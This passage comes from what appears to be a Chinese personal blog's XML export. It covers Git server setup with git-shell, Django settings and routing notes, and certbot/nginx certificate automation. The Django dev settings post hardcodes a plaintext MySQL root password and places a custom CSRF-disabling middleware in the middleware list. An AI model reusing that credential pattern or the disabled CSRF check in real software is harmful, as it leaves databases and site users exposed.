class="hljs-number">1001</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/git</span><span class="hljs-symbol">:/bin/bash</span><br><br></code></pre></td></tr></table></figure><p>改为：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">git:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/git</span><span class="hljs-symbol">:/usr/bin/git-shell</span><br><br></code></pre></td></tr></table></figure><p>这样，git用户可以正常通过ssh使用git，但无法登录shell，因为我们为git用户指定的git-shell每次一登录就自动退出。</p><h5 id="第六步，克隆远程仓库："><a href="#第六步，克隆远程仓库：" class="headerlink" title="第六步，克隆远程仓库："></a>第六步，克隆远程仓库：</h5><p>现在，可以通过git clone命令克隆远程仓库了，在各自的电脑上运行：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>git clone git<span class="hljs-variable">@server</span><span class="hljs-symbol">:/srv/sample</span>.git<br>Cloning into <span class="hljs-string">&#x27;sample&#x27;</span>...<br><span class="hljs-symbol">warning:</span> You appear to have cloned an empty repository.<br><br></code></pre></td></tr></table></figure><p>剩下的推送就简单了。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> DevOps </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django-dev.py</title>
      <link href="/2017/08/18/Django-dev%E7%8E%AF%E5%A2%83/"/>
      <url>/2017/08/18/Django-dev%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> settings.common <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># for multi computer room deploy and use separate redis server</span><br>DEPLOY_ZONE  = <span class="hljs-string">&#x27;&#x27;</span><br><br>MIDDLEWARE = [<br>    <span class="hljs-string">&#x27;service.csrf_service.DisableCSRF&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.middleware.security.SecurityMiddleware&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.middleware.common.CommonMiddleware&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;</span>,<br>    <span class="hljs-string">&#x27;service.permission.api_permission.ApiPermissionCheck&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;</span>,<br>]<br></code></pre></td></tr></table></figure><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="hljs-string">&#x27;media&#x27;</span>)<br>MEDIA_URL = <span class="hljs-string">&#x27;/media/&#x27;</span><br><br><span class="hljs-comment"># Database</span><br><span class="hljs-comment"># https://docs.djangoproject.com/en/1.11/ref/settings/#databases</span><br><br>DATABASES = &#123;<br>    <span class="hljs-string">&#x27;default&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;ENGINE&#x27;</span>: <span class="hljs-string">&#x27;django.db.backends.mysql&#x27;</span>,  <span class="hljs-comment"># Add &#x27;postgresql_psycopg2&#x27;, &#x27;mysql&#x27;, &#x27;sqlite3&#x27; or &#x27;oracle&#x27;.</span><br>            <span class="hljs-string">&#x27;NAME&#x27;</span>: <span class="hljs-string">&#x27;loonflownew&#x27;</span>,  <span class="hljs-comment"># Or path to database file if using sqlite3.</span><br>            <span class="hljs-string">&#x27;USER&#x27;</span>: <span class="hljs-string">&#x27;root&#x27;</span>,  <span class="hljs-comment"># Not used with sqlite3.</span><br>            <span class="hljs-string">&#x27;PASSWORD&#x27;</span>: <span class="hljs-string">&#x27;8&#123;U]@El5C/)H&#x27;</span>,  <span class="hljs-comment"># Not used with sqlite3.</span><br>            <span class="hljs-string">&#x27;HOST&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,  <span class="hljs-comment"># Set to empty string for localhost. Not used with sqlite3.</span><br>            <span class="hljs-string">&#x27;PORT&#x27;</span>: <span class="hljs-string">&#x27;3306&#x27;</span>,  <span class="hljs-comment"># Set to empty string for default. Not used with sqlite3.</span><br>        &#125;<br>&#125;<br><br>REDIS_HOST = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>REDIS_PORT = <span class="hljs-number">6379</span><br>REDIS_DB = <span class="hljs-number">0</span><br>REDIS_PASSWORD = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> REDIS_PASSWORD:<br>    CELERY_BROKER_URL = <span class="hljs-string">&#x27;redis://:&#123;&#125;@&#123;&#125;:&#123;&#125;/&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(REDIS_PASSWORD, REDIS_HOST, REDIS_PORT, REDIS_DB)<br><span class="hljs-keyword">else</span>:<br>    CELERY_BROKER_URL = <span class="hljs-string">&#x27;redis://&#123;&#125;:&#123;&#125;/&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(REDIS_HOST, REDIS_PORT, REDIS_DB)<br><br>LOGGING = &#123;<br>        <span class="hljs-string">&#x27;version&#x27;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&#x27;disable_existing_loggers&#x27;</span>: <span class="hljs-literal">False</span>,<br>        <span class="hljs-string">&#x27;filters&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;require_debug_true&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;()&#x27;</span>: <span class="hljs-string">&#x27;django.utils.log.RequireDebugTrue&#x27;</span>,<br>            &#125;,<br>        &#125;,<br>        <span class="hljs-string">&#x27;formatters&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;standard&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;format&#x27;</span>: <span class="hljs-string">&#x27;%(asctime)s %(pathname)s process-%(process)d thread-%(thread)d %(lineno)d [%(levelname)s]: %(message)s&#x27;</span>,<br>            &#125;,<br>        &#125;,<br>        <span class="hljs-string">&#x27;handlers&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;file_handler&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;level&#x27;</span>: <span class="hljs-string">&#x27;DEBUG&#x27;</span>,<br>                <span class="hljs-string">&#x27;class&#x27;</span>: <span class="hljs-string">&#x27;logging.FileHandler&#x27;</span>,<br>                <span class="hljs-string">&#x27;filename&#x27;</span>: HOMEPATH + <span class="hljs-string">&#x27;/loonflow.log&#x27;</span>,<br>                <span class="hljs-string">&#x27;formatter&#x27;</span>: <span class="hljs-string">&#x27;standard&#x27;</span><br>            &#125;,<br>            <span class="hljs-string">&#x27;console&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;level&#x27;</span>: <span class="hljs-string">&#x27;DEBUG&#x27;</span>,<br>                <span class="hljs-string">&#x27;filters&#x27;</span>: [<span class="hljs-string">&#x27;require_debug_true&#x27;</span>],<br>                <span class="hljs-string">&#x27;class&#x27;</span>: <span class="hljs-string">&#x27;logging.StreamHandler&#x27;</span>,<br>                <span class="hljs-string">&#x27;formatter&#x27;</span>: <span class="hljs-string">&#x27;standard&#x27;</span><br>            &#125;,<br>        &#125;,<br>        <span class="hljs-string">&#x27;loggers&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;django&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;handlers&#x27;</span>: [<span class="hljs-string">&#x27;file_handler&#x27;</span>],<br>                <span class="hljs-string">&#x27;propagate&#x27;</span>: <span class="hljs-literal">True</span>,<br>                <span class="hljs-string">&#x27;level&#x27;</span>: <span class="hljs-string">&#x27;INFO&#x27;</span>,<br>                        &#125;,<br>            <span class="hljs-string">&#x27;django.db.backends&#x27;</span>: &#123;<br>                <span class="hljs-string">&#x27;handlers&#x27;</span>: [<span class="hljs-string">&#x27;console&#x27;</span>],<br>                <span class="hljs-string">&#x27;propagate&#x27;</span>: <span class="hljs-literal">True</span>,<br>                <span class="hljs-string">&#x27;level&#x27;</span>: <span class="hljs-string">&#x27;INFO&#x27;</span>,<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Django </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新建Django的第一个应用</title>
      <link href="/2017/08/18/Django%E5%85%A5%E9%97%A8-2-%E6%96%B0%E5%BB%BAdjango%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8/"/>
      <url>/2017/08/18/Django%E5%85%A5%E9%97%A8-2-%E6%96%B0%E5%BB%BAdjango%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h3 id="2-3-3-Creating-the-Polls-app"><a href="#2-3-3-Creating-the-Polls-app" class="headerlink" title="2.3.3 Creating the Polls app"></a>2.3.3 Creating the Polls app</h3><p>Now that your environment – a “project” – is set up, you’re set to start doing work.<br>Each application you write in Django consists of a Python package that follows a certain convention. Django comes<br>with a utility that automatically generates the basic directory structure of an app, so you can focus on writing code<br>rather than creating directories.<br>Projects vs. apps<br>What’s the difference between a project and an app? An app is aWeb application that does something – e.g., aWeblog<br>system, a database of public records or a small poll app. A project is a collection of configuration and apps for a<br>particular website. A project can contain multiple apps. An app can be in multiple projects.<br>Your apps can live anywhere on your Python path. In this tutorial, we’ll create our poll app in the same directory as<br>your manage.py file so that it can be imported as its own top-level module, rather than a submodule of mysite.<br>To create your app, make sure you’re in the same directory as manage.py and type this command:</p><pre><code>$ python manage.py startapp polls</code></pre><p>That’ll create a directory polls, which is laid out like this:<br>16</p><pre><code>根urls.pyurlpatterns=[    path(&#39;admin/&#39;,admin.site.urls),    path(&#39;hello/&#39;,include(&#39;myapp.urls&#39;)),    path(&#39;sign/&#39;,include(&#39;myapp.urls&#39;)),]</code></pre><span id="more"></span>        <p>#django的处理流程，根urls.py.（Django使用的是根URLconf模块。这个值通常是通过ROOT_URLCONF</p><pre><code>#设置（在.../settings.py中）ROOT_URLCONF=&#39;djangonew.urls&#39;</code></pre><h4 id="3-Django加载URLconf模块（urls-py文件，并寻找可用的urlpatterns"><a href="#3-Django加载URLconf模块（urls-py文件，并寻找可用的urlpatterns" class="headerlink" title="3,Django加载URLconf模块（urls.py文件，并寻找可用的urlpatterns"></a>3,Django加载URLconf模块（urls.py文件，并寻找可用的urlpatterns</h4><h4 id="4-Django依次匹配每个URL模块，直到匹配到相对应的模块处。"><a href="#4-Django依次匹配每个URL模块，直到匹配到相对应的模块处。" class="headerlink" title="4,Django依次匹配每个URL模块，直到匹配到相对应的模块处。"></a>4,Django依次匹配每个URL模块，直到匹配到相对应的模块处。</h4><h4 id="5，一旦匹配到相应的URL，则将请求指向对应的视图函数处理。"><a href="#5，一旦匹配到相应的URL，则将请求指向对应的视图函数处理。" class="headerlink" title="5，一旦匹配到相应的URL，则将请求指向对应的视图函数处理。"></a>5，一旦匹配到相应的URL，则将请求指向对应的视图函数处理。</h4><h4 id="6，如果没有匹配到正则表达式，或者过程中抛出异常，则Django将调用一个适合的错误处理视图。"><a href="#6，如果没有匹配到正则表达式，或者过程中抛出异常，则Django将调用一个适合的错误处理视图。" class="headerlink" title="6，如果没有匹配到正则表达式，或者过程中抛出异常，则Django将调用一个适合的错误处理视图。"></a>6，如果没有匹配到正则表达式，或者过程中抛出异常，则Django将调用一个适合的错误处理视图。</h4><pre><code>  include(myapp.urls) 转到   myapp 中的 urls.py  ,映射到 views , views.hello 方法。fromdjango.urlsimportpathfrom.importviewsurlpatterns=[path(&#39;&#39;,views.hello,name=&#39;hello&#39;),path(&#39;&#39;,views.hello,name=&#39;sign&#39;)]Name 对应，urlViewsfromdjango.shortcutsimportrender#Createyourviewshere.fromdjango.httpimportHttpResponse#需要导入HttpResponse模块defhello(request):context=&#123;&#125;context[&#39;hello&#39;]=&#39;HelloWorld&#39;returnrender(request,&#39;hello.html&#39;,context)</code></pre><h6 id="request参数必须有，名字类似self的默认规则，可以修改，它封装了用户请求的所有内容"><a href="#request参数必须有，名字类似self的默认规则，可以修改，它封装了用户请求的所有内容" class="headerlink" title="request参数必须有，名字类似self的默认规则，可以修改，它封装了用户请求的所有内容"></a>request参数必须有，名字类似self的默认规则，可以修改，它封装了用户请求的所有内容</h6><h6 id="returnHttpResponse-“Helloworld-”-不能直接字符串，必须是由这个类封装，此为Django规则"><a href="#returnHttpResponse-“Helloworld-”-不能直接字符串，必须是由这个类封装，此为Django规则" class="headerlink" title="returnHttpResponse(“Helloworld!”)#不能直接字符串，必须是由这个类封装，此为Django规则"></a>returnHttpResponse(“Helloworld!”)#不能直接字符串，必须是由这个类封装，此为Django规则</h6></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Django </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django入门</title>
      <link href="/2017/08/18/Django%E5%85%A5%E9%97%A8/"/>
      <url>/2017/08/18/Django%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h3 id="（1）安装特定版本的-django"><a href="#（1）安装特定版本的-django" class="headerlink" title="（1）安装特定版本的 django"></a>（1）安装特定版本的 django</h3><pre><code>C:\Program Files\Python37\Scripts\security&gt;pip install django==2.2Collecting django==2.2  Using cached Django-2.2-py3-none-any.whl (7.4 MB)Requirement already satisfied: pytz in c:\program files\python37\lib\site-packages (from django==2.2) (2019.3)Requirement already satisfied: sqlparse in c:\program files\python37\lib\site-packages (from django==2.2) (0.3.1)Installing collected packages: djangoSuccessfully installed django-2.2</code></pre><h3 id="（2）创建项目"><a href="#（2）创建项目" class="headerlink" title="（2）创建项目"></a>（2）创建项目</h3><p>C:\Program Files\Python37\Scripts 目录下运行</p><pre><code>django-admin startproject mysite</code></pre><p>（备注利用 pycham 自行创建了一个djangonew 的项目。其中，django 事先进行了安装，导致系统报错了。对django 进行卸载后，顺利建立了该项目。]</p><pre><code>Pip uninstall django </code></pre><p>创建站点或者说是app,应用等。<br>2.3.3 Creating the Polls app<br>Now that your environment – a “project” – is set up, you’re set to start doing work.<br>Each application you write in Django consists of a Python package that follows a certain convention. Django comes<br>with a utility that automatically generates the basic directory structure of an app, so you can focus on writing code<br>rather than creating directories.<br>Projects vs. apps<br>What’s the difference between a project and an app? An app is aWeb application that does something – e.g., aWeblog<br>system, a database of public records or a small poll app. A project is a collection of configuration and apps for a<br>particular website. A project can contain multiple apps. An app can be in multiple projects.<br>Your apps can live anywhere on your Python path. In this tutorial, we’ll create our poll app in the same directory as<br>your manage.py file so that it can be imported as its own top-level module, rather than a submodule of mysite.<br>To create your app, make sure you’re in the same directory as manage.py and type this command:<br>$ python manage.py startapp polls<br>That’ll create a directory polls, which is laid out like this:</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git操作命令集锦</title>
      <link href="/2017/08/18/Git%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E9%94%A6-PDF%E7%89%88/"/>
      <url>/2017/08/18/Git%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E9%9B%86%E9%94%A6-PDF%E7%89%88/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h3 id="由外国人提供的PDF命令集锦，真正使用的Git命令也就那么10多个，熟练运用即可。"><a href="#由外国人提供的PDF命令集锦，真正使用的Git命令也就那么10多个，熟练运用即可。" class="headerlink" title="由外国人提供的PDF命令集锦，真正使用的Git命令也就那么10多个，熟练运用即可。"></a>由外国人提供的PDF命令集锦，真正使用的Git命令也就那么10多个，熟练运用即可。</h3><div class="row">    <embed src="/pdf/git-cheatsheet.pdf" width="100%" height="550" type="application/pdf"></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DevOps </tag>
            
            <tag> Git </tag>
            
            <tag> PDF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何免费的获取无限期ssl证书</title>
      <link href="/2017/06/30/%E5%A6%82%E4%BD%95%E5%85%8D%E8%B4%B9%E8%8E%B7%E5%8F%96%E6%97%A0%E9%99%90%E6%9C%9Fssl%E8%AF%81%E4%B9%A6/"/>
      <url>/2017/06/30/%E5%A6%82%E4%BD%95%E5%85%8D%E8%B4%B9%E8%8E%B7%E5%8F%96%E6%97%A0%E9%99%90%E6%9C%9Fssl%E8%AF%81%E4%B9%A6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>自己做了一个博客网站，hexo ,加 相应的模板。几经修改，申请备案了域名。 buhuixiu.com. 但是上线的时候发现，浏览器默认跑https，而相应的nginx 需要配置证书。。如果自己生成的证书，将会提示证书不可信。 如果取买，动辄上千一年，比我自己买的VPS还贵。如果手动取申请，也只能免费3个月，3个月后又需要去手动申请。麻烦。有没有好点的解决办法？</p><h4 id="解决办法-将申请三个月免费证书的动作计划执行。"><a href="#解决办法-将申请三个月免费证书的动作计划执行。" class="headerlink" title="解决办法-将申请三个月免费证书的动作计划执行。"></a>解决办法-将申请三个月免费证书的动作计划执行。</h4><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>centos:   (centos linux release 7.2.1511)<br>nginx:   (nginx version : nginx/1.18.0)<br>nginx 安装路径 :    /usr/local/nginx<br>EXpressJS应用<br>域名： <a href="http://www.buhuixiu.com/">www.buhuixiu.com</a></p><h4 id="安装CertBot"><a href="#安装CertBot" class="headerlink" title="安装CertBot"></a>安装CertBot</h4><p>命令行运行，键入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo yum install epel-release<br>sudo yum install certbot<br><br><br></code></pre></td></tr></table></figure><h4 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h4><p>这里我不想使用CertBot的standalone模式，这个模式虽然可以配置好服务器，但是以后Renew的时候，需要让服务停止一下，再启动。因此抛弃这个模式，我们使用Webroot配置模式。</p><p>因为，CertBot在验证服务器域名的时候，会生成一个随机文件，然后CertBot的服务器会通过HTTP访问你的这个文件，因此要确保你的Nginx配置好，以便可以访问到这个文件。</p><p>修改你的服务器配置，在server模块添加：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>location ^~ /.well-known/acme-challenge/ &#123;<br>   default_type &quot;text/plain&quot;;<br>   root   /usr/local/nginx/html;<br><span class="hljs-meta">#</span><span class="bash">   root     nginx安装路径/html;</span><br>&#125;<br><br>location = /.well-known/acme-challenge/ &#123;<br>   return 404;<br>&#125;<br></code></pre></td></tr></table></figure><p>重启nginx服务，这是在将nginx 注册成服务才可以使用，没有注册成服务使用-s reload. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl restart nginx<br></code></pre></td></tr></table></figure><h4 id="手动生成证书测试"><a href="#手动生成证书测试" class="headerlink" title="手动生成证书测试"></a>手动生成证书测试</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>sudo certbot certonly --webroot -w /usr/local/nginx/html/ -d www.buhuixiu.com<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> sudo certbot certonly --webroot -w nginx 安装路径/html/ -d 你的域名</span><br></code></pre></td></tr></table></figure><p>如果提示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>IMPORTANT NOTES:<br> - Congratulations! Your certificate and chain have been saved at<br>   /etc/letsencrypt/live/your.domain.com/fullchain.pem. Your cert<br>   will expire on 20XX-09-23. To obtain a new or tweaked version of<br>   this certificate in the future, simply run certbot again. To<br>   non-interactively renew *all* of your certificates, run &quot;certbot<br>   renew&quot;<br> - If you like Certbot, please consider supporting our work by:<br><br>   Donating to ISRG / Let&#x27;s Encrypt:   https://letsencrypt.org/donate<br>   Donating to EFF:                    https://eff.org/donate-le<br><br><br><br><br></code></pre></td></tr></table></figure><p>-Congratulations 恭喜，则证书生成成功。</p><h4 id="配置nginx-，启用443端口，配置证书路径。"><a href="#配置nginx-，启用443端口，配置证书路径。" class="headerlink" title="配置nginx ，启用443端口，配置证书路径。"></a>配置nginx ，启用443端口，配置证书路径。</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">     HTTPS server</span><br><span class="hljs-meta">#</span><span class="bash"> </span>  <br>    server &#123;<br>        listen       443 ssl;<br>        server_name  www.buhuixiu.com;<br><span class="hljs-meta">#</span><span class="bash"> server_name 你的域名</span><br><br>        ssl_certificate /etc/letsencrypt/live/www.buhuixiu.com/fullchain.pem;<br><span class="hljs-meta"> #</span><span class="bash">       ssl_certificate /etc/letsencrypt/live/你的域名/fullchain.pem;</span> <br> <br>        ssl_certificate_key /etc/letsencrypt/live/www.buhuixiu.com/privkey.pem;<br>        ssl_trusted_certificate /etc/letsencrypt/live/www.buhuixiu.com/chain.pem;<br><span class="hljs-meta">#</span><span class="bash">       ssl_session_cache    shared:SSL:1m;</span><br><span class="hljs-meta">#</span><span class="bash">      ssl_session_timeout  5m;</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment">#       ssl_ciphers  HIGH:!aNULL:!MD5;</span></span><br><span class="hljs-meta">#</span><span class="bash">      ssl_prefer_server_ciphers  on;</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash">      location / &#123;</span><br>            root   /home/git/projects/blog;<br>            index  index.html index.htm;<br><br>            <br>        &#125;<br>    &#125;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><h4 id="自动更新证书"><a href="#自动更新证书" class="headerlink" title="自动更新证书"></a>自动更新证书</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo certbot renew --dry-run<br><br></code></pre></td></tr></table></figure><p>模拟更新成功的效果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>-------------------------------------------------------------------------------<br>Processing /etc/letsencrypt/renewal/your.domain.com.conf<br>-------------------------------------------------------------------------------<br>** DRY RUN: simulating &#x27;certbot renew&#x27; close to cert expiry<br>**          (The test certificates below have not been saved.)<br><br>Congratulations, all renewals succeeded. The following certs have been renewed:<br>  /etc/letsencrypt/live/your.domain.com/fullchain.pem (success)<br>** DRY RUN: simulating &#x27;certbot renew&#x27; close to cert expiry<br>**          (The test certificates above have not been saved.)<br><br><br><br></code></pre></td></tr></table></figure><p>既然模拟成功了，就用crontab -e来添加计划任务，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>sudo crontab -e<br></code></pre></td></tr></table></figure><p>添加配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>30 2  1 * *  /usr/bin/certbot renew  &gt;&gt; /var/log/le-renew.log<br><br></code></pre></td></tr></table></figure><p>每月1号的2点30分执行计划任务。<br>你可以在命令行执行/usr/bin/certbot renew &gt;&gt; 